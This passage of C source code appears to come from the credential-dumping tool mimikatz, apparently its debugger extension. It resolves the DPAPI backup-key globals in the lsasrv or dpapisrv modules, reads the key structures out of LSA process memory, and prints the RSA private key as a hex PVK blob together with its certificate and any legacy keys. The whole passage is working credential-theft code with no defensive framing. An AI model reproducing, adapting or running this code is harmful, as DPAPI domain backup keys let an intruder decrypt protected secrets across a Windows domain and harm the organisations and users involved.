	PBYTE pExport = NULL;

	if(pGuid && pPb && pCb)
	{
		dprintf("\n%s", text);
		if(ReadMemory(pGuid, &guid, sizeof(GUID), NULL))
			kull_m_string_displayGUID(&guid);
		dprintf("\n");

		if(ReadMemory(pCb, &cb, sizeof(DWORD), NULL) && ReadMemory(pPb, &tmpPtr, sizeof(PVOID), NULL))
		{
			if(cb && tmpPtr)
			{
				if(buffer = (PKIWI_BACKUP_KEY) LocalAlloc(LPTR, cb))
				{
					if(ReadMemory((ULONG_PTR) tmpPtr, buffer, cb, NULL))
					{
						switch(buffer->version)
						{
						case 2:
							dprintf("  * RSA key\n");
							pvkHeader.cbPvk = buffer->keyLen;
							szPVK = sizeof(PVK_FILE_HDR) + pvkHeader.cbPvk ;
							if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
							{
								RtlCopyMemory(pExport, &pvkHeader, sizeof(PVK_FILE_HDR));
								RtlCopyMemory(pExport + sizeof(PVK_FILE_HDR), buffer->data, pvkHeader.cbPvk);
								dprintf("\tPVK (private key)\n"); kull_m_string_dprintf_hex(pExport, szPVK, (32 << 16)); dprintf("\n");
								LocalFree(pExport);
							}
							dprintf("\tDER (public key and certificate)\n"); kull_m_string_dprintf_hex(buffer->data + buffer->keyLen, buffer->certLen, (32 << 16)); dprintf("\n");
							break;
						case 1:
							dprintf("  * Legacy key\n");
							kull_m_string_dprintf_hex((PBYTE) buffer + sizeof(DWORD), cb - sizeof(DWORD), (32 << 16));
							dprintf("\n");
							break;
						default:
							dprintf("  * Unknown key (seen as %08x)\n", buffer->version);
							kull_m_string_dprintf_hex((PBYTE) buffer, cb, (32 << 16));
							dprintf("\n");
						}
					}
					LocalFree(buffer);
				}
			}
		}
	}
}

void kuhl_sekurlsa_dpapi_backupkeys()
{
	ULONG_PTR g_guidPreferredKey, g_pbPreferredKey, g_cbPreferredKey, g_guidW2KPreferredKey, g_pbW2KPreferredKey, g_cbW2KPreferredKey;

	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
	{
		g_guidPreferredKey = GetExpression("lsasrv!g_guidPreferredKey");
		g_pbPreferredKey = GetExpression("lsasrv!g_pbPreferredKey");
		g_cbPreferredKey = GetExpression("lsasrv!g_cbPreferredKey");
		g_guidW2KPreferredKey = GetExpression("lsasrv!g_guidW2KPreferredKey");
		g_pbW2KPreferredKey = GetExpression("lsasrv!g_pbW2KPreferredKey");
		g_cbW2KPreferredKey = GetExpression("lsasrv!g_cbW2KPreferredKey");
	}
	else
	{
		g_guidPreferredKey = GetExpression("dpapisrv!g_guidPreferredKey");
		g_pbPreferredKey = GetExpression("dpapisrv!g_pbPreferredKey");
		g_cbPreferredKey = GetExpression("dpapisrv!g_cbPreferredKey");
		g_guidW2KPreferredKey = GetExpression("dpapisrv!g_guidW2KPreferredKey");
		g_pbW2KPreferredKey = GetExpression("dpapisrv!g_pbW2KPreferredKey");
		g_cbW2KPreferredKey = GetExpression("dpapisrv!g_cbW2KPreferredKey");
	}
	
	if((g_guidPreferredKey && g_pbPreferredKey && g_cbPreferredKey) || (g_guidW2KPreferredKey && g_pbW2KPreferredKey && g_cbW2KPreferredKey))
	{
		dprintf("\nDPAPI Backup keys\n=================\n");
		kuhl_sekurlsa_dpapi_display_backupkey(g_guidPreferredKey, g_pbPreferredKey, g_cbPreferredKey, "Current prefered key:       ");
		kuhl_sekurlsa_dpapi_display_backupkey(g_guidW2KPreferredKey, g_pbW2KPreferredKey, g_cbW2KPreferredKey, "Compatibility prefered key: ");
	}
	
}